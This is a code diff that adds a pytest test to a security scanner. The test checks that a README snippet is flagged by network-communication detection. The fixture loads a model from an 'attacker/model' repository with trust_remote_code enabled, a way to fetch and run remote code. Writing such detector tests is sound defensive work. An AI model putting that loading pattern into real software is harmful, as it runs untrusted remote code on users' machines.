@@ -481,6 +481,27 @@ def test_text_scanner_readme_plain_http_sample_image_stays_actionable(tmp_path: 
     )
 
 
+def test_text_scanner_readme_remote_code_trust_stays_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "```python\nimport requests\nfrom transformers import AutoModel\n"
+        "image_url = 'https://huggingface.co/spaces/org/demo/resolve/main/image.png'\n"
+        "AutoModel.from_pretrained('attacker/model', trust_remote_code=1)\n"
+        "requests.get(image_url, stream=True)\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "network_function"
+        for check in result.checks
+    )
+
+
 @pytest.mark.parametrize(
     ("filename", "command"),
     [
